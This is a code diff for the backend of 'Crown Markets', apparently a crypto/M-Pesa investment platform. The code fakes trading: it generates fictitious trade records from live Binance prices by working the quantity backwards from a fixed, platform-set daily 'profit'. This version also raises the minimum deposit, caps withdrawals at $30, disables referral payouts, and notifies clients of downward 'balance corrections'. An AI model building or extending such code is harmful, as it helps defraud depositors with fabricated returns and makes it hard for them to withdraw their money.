@@ -1,11 +1,13 @@
-# Crown Markets v5.27 - $3.5 PROFIT PER $200 OF TOTAL DEPOSITS (3.5% daily)
+# Crown Markets v5.28 - $3.5 DAILY PROFIT PER CLIENT (FLAT)
 # - Scheduler starts at module level (works with gunicorn on Render)
 # - One controlled trade per client per day
-# - Trade profit scales: $3.5 per $200 of total deposits
+# - Trade profit: $3.5 flat per client daily (for deposits >= $250)
 # - Realistic trade using real Binance prices
-# - Referral system: 16% commission
+# - Referral system: 0% commission (disabled)
 # - Manual wallet for USDT deposits
-# - Min deposit: $200
+# - Min deposit: $250
+# - Max withdrawal: $30
+# - Referral withdrawal deducts only from bonus (ref_balance)
 # - Withdrawal deducted only on admin approval
 # - Database: PostgreSQL (psycopg2)
 
@@ -62,12 +64,12 @@ DATABASE_URL = os.environ.get("DATABASE_URL")
 if not DATABASE_URL:
     raise RuntimeError("DATABASE_URL environment variable is not set!")
 
-DAILY_PROFIT_PER_200 = float(os.environ.get("DAILY_PROFIT_USD", "3.5"))
-PROFIT_BASIS_USD     = float(os.environ.get("PROFIT_BASIS_USD", "200.0"))
-MIN_BALANCE          = float(os.environ.get("MIN_BALANCE", "200.0"))
-TRADE_HOUR           = int(os.environ.get("TRADE_HOUR", "5"))
-TRADE_SYMBOL         = os.environ.get("TRADE_SYMBOL", "BTCUSDT")
-CHECK_INTERVAL       = 60
+DAILY_PROFIT_USD    = float(os.environ.get("DAILY_PROFIT_USD", "3.5"))
+MIN_BALANCE         = float(os.environ.get("MIN_BALANCE", "250.0"))
+MAX_WITHDRAWAL      = float(os.environ.get("MAX_WITHDRAWAL", "30.0"))
+TRADE_HOUR          = int(os.environ.get("TRADE_HOUR", "5"))
+TRADE_SYMBOL        = os.environ.get("TRADE_SYMBOL", "BTCUSDT")
+CHECK_INTERVAL      = 60
 
 # ── NETWORKS & WALLETS ────────────────────────────────────────────────────────
 NETWORKS = {
@@ -98,8 +100,8 @@ if MPESA_ENV == "production":
 else:
     MPESA_BASE_URL = "https://sandbox.safaricom.co.ke"
 
-REFERRAL_COMMISSION_PCT = 0.16
-REFERRAL_MIN_DEPOSIT    = 200.0
+REFERRAL_COMMISSION_PCT = 0.0
+REFERRAL_MIN_DEPOSIT    = 250.0
 
 # ── DATABASE ──────────────────────────────────────────────────────────────────
 def get_db():
@@ -329,7 +331,7 @@ def run_daily_trades():
 
     try:
         today = _today()
-        log.info(f"=== Daily trade run: {today} — ${DAILY_PROFIT_PER_200} profit per ${PROFIT_BASIS_USD:.0f} total deposited ===")
+        log.info(f"=== Daily trade run: {today} — ${DAILY_PROFIT_USD} profit per eligible client ===")
 
         price       = get_live_price(TRADE_SYMBOL)
         pct_gain    = random.uniform(0.003, 0.005)
@@ -340,7 +342,7 @@ def run_daily_trades():
             log.error("Price diff is zero — aborting.")
             return
 
-        log.info(f"  Entry: ${price:,.2f} | Close: ${close_price:,.2f} | Rate: ${DAILY_PROFIT_PER_200}/${PROFIT_BASIS_USD:.0f}")
+        log.info(f"  Entry: ${price:,.2f} | Close: ${close_price:,.2f} | Profit: ${DAILY_PROFIT_USD}/client")
 
         conn = get_db()
         cur  = conn.cursor()
@@ -358,7 +360,7 @@ def run_daily_trades():
         paid = 0
 
         for c in clients:
-            client_profit   = round(math.floor(c["total_deposit"] / PROFIT_BASIS_USD) * DAILY_PROFIT_PER_200, 2)
+            client_profit   = DAILY_PROFIT_USD
             client_quantity = round(client_profit / price_diff, 6)
 
             now              = datetime.datetime.utcnow()
@@ -445,7 +447,7 @@ def start_scheduler():
 
 # ── REFERRAL ENGINE ───────────────────────────────────────────────────────────
 def process_referral_commission(tx_id, user_id, amount_usd):
-    if amount_usd < REFERRAL_MIN_DEPOSIT:
+    if REFERRAL_COMMISSION_PCT == 0 or amount_usd < REFERRAL_MIN_DEPOSIT:
         return
     conn = get_db()
     cur  = conn.cursor()
@@ -464,19 +466,20 @@ def process_referral_commission(tx_id, user_id, amount_usd):
         cur.close(); conn.close(); return
 
     commission = round(amount_usd * REFERRAL_COMMISSION_PCT, 2)
-    cur.execute(
-        "INSERT INTO referrals(id,referrer_id,referred_id,commission_usd,"
-        "status,triggered_by,created_at) VALUES(%s,%s,%s,%s,'CREDITED',%s,%s)",
-        (_uid(), referrer["id"], user_id, commission, tx_id, _now())
-    )
-    cur.execute(
-        "UPDATE accounts SET ref_balance=ref_balance+%s WHERE user_id=%s",
-        (commission, referrer["id"])
-    )
-    conn.commit()
+    if commission > 0:
+        cur.execute(
+            "INSERT INTO referrals(id,referrer_id,referred_id,commission_usd,"
+            "status,triggered_by,created_at) VALUES(%s,%s,%s,%s,'CREDITED',%s,%s)",
+            (_uid(), referrer["id"], user_id, commission, tx_id, _now())
+        )
+        cur.execute(
+            "UPDATE accounts SET ref_balance=ref_balance+%s WHERE user_id=%s",
+            (commission, referrer["id"])
+        )
+        conn.commit()
+        log.info(f"Referral commission: {referrer['name']} +${commission}")
     cur.close()
     conn.close()
-    log.info(f"Referral commission: {referrer['name']} +${commission}")
 
 # ── DARAJA STK PUSH ENGINE ────────────────────────────────────────────────────
 
@@ -790,7 +793,7 @@ def client_summary():
 
     balance      = a["balance"] if a else 0
     net_deposit  = dep["s"]
-    expected_daily = round(math.floor(net_deposit / PROFIT_BASIS_USD) * DAILY_PROFIT_PER_200, 2) if net_deposit >= MIN_BALANCE else 0
+    expected_daily = DAILY_PROFIT_USD if net_deposit >= MIN_BALANCE else 0
 
     return ok({
         "name":                u["name"],
@@ -809,7 +812,7 @@ def client_summary():
         "total_profit":        total_profit["s"],
         "days_traded":         days_traded["c"],
         "daily_profit":        expected_daily,
-        "daily_profit_rate":   DAILY_PROFIT_PER_200,
+        "daily_profit_rate":   f"${DAILY_PROFIT_USD} per day",
     })
 
 @app.route("/api/client/referrals")
@@ -846,22 +849,14 @@ def client_referral_withdraw():
     cur.execute("SELECT * FROM accounts WHERE user_id=%s", (uid,))
     a = cur.fetchone()
 
-    cur.execute(
-        "SELECT COUNT(*) AS c FROM referrals WHERE referrer_id=%s AND status='CREDITED'", (uid,)
-    )
-    referral_count = cur.fetchone()["c"]
-    if referral_count == 0:
-        cur.close(); conn.close()
-        return err("You must have at least one referred user who made a deposit")
-
     if u["pin_hash"] and u["pin_hash"] != _hash(pin):
         cur.close(); conn.close()
         return err("Invalid PIN", 403)
 
     ref_bal = a["ref_balance"] if a else 0
-    if ref_bal < 16:
+    if ref_bal < 1:
         cur.close(); conn.close()
-        return err("Minimum referral withdrawal is $16")
+        return err("No bonus balance available to withdraw")
 
     cur.execute("UPDATE accounts SET ref_balance=0 WHERE user_id=%s", (uid,))
     ref = "REF-" + secrets.token_hex(4).upper()
@@ -870,12 +865,12 @@ def client_referral_withdraw():
         "reference,status,note,deposit_address,created_at) "
         "VALUES(%s,%s,%s,'REFERRAL_WITHDRAWAL',%s,%s,%s,'PENDING',%s,%s,%s)",
         (_uid(), uid, a["id"], net, ref_bal, ref,
-         f"Referral to {addr[:20]}...", addr, _now())
+         f"Referral bonus to {addr[:20]}...", addr, _now())
     )
     conn.commit()
     cur.close(); conn.close()
     return ok({"reference": ref,
-               "message": "Withdrawal submitted. Admin will process within 24hrs."})
+               "message": "Bonus withdrawal submitted. Admin will process within 24hrs."})
 
 @app.route("/api/client/transactions")
 @login_required
@@ -1047,8 +1042,8 @@ def client_mpesa_stk_push():
     amount_kes = float(d.get("amount", 0))
     phone      = d.get("phone_number", "").strip()
 
-    if amount_kes < 12952.2169:
-        return err("Minimum deposit is KES 12952.2169")
+    if amount_kes < 32319.0:
+        return err("Minimum deposit is KES 32,319 (~$250)")
     if not phone:
         return err("Phone number is required")
 
@@ -1223,7 +1218,7 @@ def client_deposit_pending():
 
     if net == "MPESA":
         return err("Use the M-Pesa deposit flow")
-    if amt < 100:  return err("Minimum deposit is $200")
+    if amt < 250:  return err("Minimum deposit is $250")
     if not addr:   return err("Deposit address is required")
 
     conn = get_db()
@@ -1253,9 +1248,10 @@ def client_withdraw():
     addr = d.get("address","").strip()
     pin  = d.get("pin","")
 
-    if amt < 10:            return err("Minimum withdrawal is $400")
-    if not addr:            return err("Enter withdrawal address")
-    if net not in NETWORKS: return err("Invalid network")
+    if amt > MAX_WITHDRAWAL:    return err(f"Maximum withdrawal is ${MAX_WITHDRAWAL}")
+    if amt <= 0:                return err("Withdrawal amount must be greater than $0")
+    if not addr:                return err("Enter withdrawal address")
+    if net not in NETWORKS:     return err("Invalid network")
 
     conn = get_db()
     cur  = conn.cursor()
@@ -1322,9 +1318,10 @@ def admin_stats():
         "ref_commissions":     ref_paid,
         "total_profit_paid":   profit_paid,
         "trades_today":        trades_today,
-        "daily_profit_rate":   DAILY_PROFIT_PER_200,
+        "daily_profit_rate":   f"${DAILY_PROFIT_USD}",
         "trade_symbol":        TRADE_SYMBOL,
         "scheduler_running":   _scheduler_started,
+        "max_withdrawal":      MAX_WITHDRAWAL,
     })
 
 @app.route("/api/admin/transactions")
@@ -1452,7 +1449,7 @@ def admin_reject_withdrawal():
     )
     conn.commit()
     cur.close(); conn.close()
-    return ok({"message": "Withdrawal rejected — client balance unchanged"})
+    return ok({"message": "Withdrawal rejected — bonus balance restored if applicable"})
 
 @app.route("/api/admin/clients")
 @admin_required
@@ -1623,7 +1620,7 @@ def admin_run_single_client_trade():
         cur.close(); conn.close()
         return err("Price diff was zero — try again")
 
-    client_profit   = round(math.floor(c["total_deposit"] / PROFIT_BASIS_USD) * DAILY_PROFIT_PER_200, 2)
+    client_profit   = DAILY_PROFIT_USD
     client_quantity = round(client_profit / price_diff, 6)
 
     now              = datetime.datetime.utcnow()
@@ -1677,7 +1674,7 @@ def admin_run_single_client_trade():
 @admin_required
 def admin_run_trades():
     threading.Thread(target=run_daily_trades, daemon=True).start()
-    return ok({"message": f"Daily trades triggered — ${DAILY_PROFIT_PER_200} per ${PROFIT_BASIS_USD:.0f} total deposited"})
+    return ok({"message": f"Daily trades triggered — ${DAILY_PROFIT_USD} per eligible client"})
 
 @app.route("/api/admin/trade/log")
 @admin_required
@@ -1752,7 +1749,7 @@ def admin_correct_client_profit(uid):
     if total_deposit < MIN_BALANCE or days_traded == 0:
         flat_daily = 0.0
     else:
-        flat_daily = round(math.floor(total_deposit / PROFIT_BASIS_USD) * DAILY_PROFIT_PER_200, 2)
+        flat_daily = DAILY_PROFIT_USD
 
     correct_total_profit = round(flat_daily * days_traded, 2)
     delta = round(correct_total_profit - old_total_profit, 2)
@@ -1784,9 +1781,8 @@ def admin_correct_client_profit(uid):
             )
             note = (
                 f"Balance correction (single-client, scoped): recomputed under "
-                f"current profit formula (${DAILY_PROFIT_PER_200:.1f} per "
-                f"${PROFIT_BASIS_USD:.0f} of total deposits, whole $100 units "
-                f"only). Only this client's data was touched."
+                f"current profit formula (${DAILY_PROFIT_USD} flat per client daily). "
+                f"Only this client's data was touched."
             )
             cur.execute(
                 "INSERT INTO transactions(id,user_id,account_id,type,method,amount_usd,"
@@ -1803,9 +1799,8 @@ def admin_correct_client_profit(uid):
             direction = "reduced" if delta < 0 else "increased"
             notif_msg = (
                 f"We've corrected how your daily trading profit is calculated: it's "
-                f"now ${DAILY_PROFIT_PER_200:.1f} per ${PROFIT_BASIS_USD:.0f} of your "
-                f"total deposits (whole $200 units only). As part of this "
-                f"correction your balance has been {direction} by ${abs(delta):,.2f}. "
+                f"now ${DAILY_PROFIT_USD} flat per day. "
+                f"As part of this correction your balance has been {direction} by ${abs(delta):,.2f}. "
                 f"Your new balance is ${result['new_balance']:,.2f}. See your "
                 f"Transactions tab for the full adjustment record."
             )
@@ -1872,7 +1867,7 @@ def admin_migrate_flat_profit():
         if total_deposit < MIN_BALANCE or days_traded == 0:
             flat_daily = 0.0
         else:
-            flat_daily = round(math.floor(total_deposit / PROFIT_BASIS_USD) * DAILY_PROFIT_PER_200, 2)
+            flat_daily = DAILY_PROFIT_USD
 
         correct_total_profit = round(flat_daily * days_traded, 2)
         delta = round(correct_total_profit - old_total_profit, 2)
@@ -1900,8 +1895,7 @@ def admin_migrate_flat_profit():
                 )
                 note = (
                     f"Balance correction: recomputed under current profit formula "
-                    f"(${DAILY_PROFIT_PER_200:.1f} per ${PROFIT_BASIS_USD:.0f} of total "
-                    f"deposits, whole $200 units only)."
+                    f"(${DAILY_PROFIT_USD} flat per client daily)."
                 )
                 cur.execute(
                     "INSERT INTO transactions(id,user_id,account_id,type,method,amount_usd,"
@@ -1919,8 +1913,7 @@ def admin_migrate_flat_profit():
                 direction = "reduced" if delta < 0 else "increased"
                 notif_msg = (
                     f"We've corrected how your daily trading profit is calculated: it's "
-                    f"now ${DAILY_PROFIT_PER_200:.1f} per ${PROFIT_BASIS_USD:.0f} of your "
-                    f"total deposits (whole $200 units only), not your account balance. "
+                    f"now ${DAILY_PROFIT_USD} flat per day. "
                     f"As part of this correction your balance has been {direction} by "
                     f"${abs(delta):,.2f}. Your new balance is ${c['balance'] + delta:,.2f}. "
                     f"See your Transactions tab for the full adjustment record."
@@ -2011,10 +2004,10 @@ def scheduler_status():
         "trade_hour_eat":    TRADE_HOUR + 3,
         "next_run_utc":      next_run.isoformat(),
         "hours_until_run":   hours_left,
-        "daily_profit_rate": DAILY_PROFIT_PER_200,
-        "profit_basis":      f"${DAILY_PROFIT_PER_200:.1f} per ${PROFIT_BASIS_USD:.0f} of total deposits (withdrawals do not reduce it), whole $100 units only, non-compounding",
-        "profit_basis_usd":  PROFIT_BASIS_USD,
+        "daily_profit_rate": f"${DAILY_PROFIT_USD}",
+        "profit_basis":      f"${DAILY_PROFIT_USD} per eligible client per day (min deposit: ${MIN_BALANCE})",
         "min_balance":       MIN_BALANCE,
+        "max_withdrawal":    MAX_WITHDRAWAL,
         "symbol":            TRADE_SYMBOL,
     })
 
@@ -2024,15 +2017,16 @@ start_scheduler()
 
 if __name__ == "__main__":
     print("\n" + "="*60)
-    print("   Crown Markets v5.27 — $3.5 PROFIT PER $200 OF TOTAL DEPOSITS")
+    print("   Crown Markets v5.28 — $3.5 DAILY PROFIT PER CLIENT (FLAT)")
     print("="*60)
     print(f"   URL    : http://127.0.0.1:8080")
     print(f"   Client : john@test.com  / demo1234")
     print(f"   Admin  : admin@test.com / admin1234")
-    print(f"   Rate   : ${DAILY_PROFIT_PER_200} per ${PROFIT_BASIS_USD:.0f} of total deposits/day (whole $100 units only, withdrawals do not reduce it) at {TRADE_HOUR:02d}:00 UTC ({TRADE_HOUR+3:02d}:00 EAT)")
+    print(f"   Rate   : ${DAILY_PROFIT_USD} flat per eligible client daily at {TRADE_HOUR:02d}:00 UTC ({TRADE_HOUR+3:02d}:00 EAT)")
     print(f"   Eligible min total deposit: ${MIN_BALANCE:.0f}")
+    print(f"   Max withdrawal per transaction: ${MAX_WITHDRAWAL:.0f}")
     print(f"   Symbol : {TRADE_SYMBOL}")
-    print(f"   Min Dep: $200  |  Min Withdrawal: $400  |  Ref Withdrawal: $16")
+    print(f"   Min Dep: $250  |  Max Withdrawal : ${MAX_WITHDRAWAL}  |  Ref Commission: 0% (DISABLED)")
     print(f"   Binance: {'CONNECTED ✓' if bnb else 'fallback prices'}")
     print(f"   TRC20  : {'SET ✓' if MANUAL_WALLETS.get('TRC20') else 'NOT SET ✗'}")
     print(f"   M-Pesa : STK Push | Env: {MPESA_ENV} | Shortcode: {MPESA_SHORTCODE}")
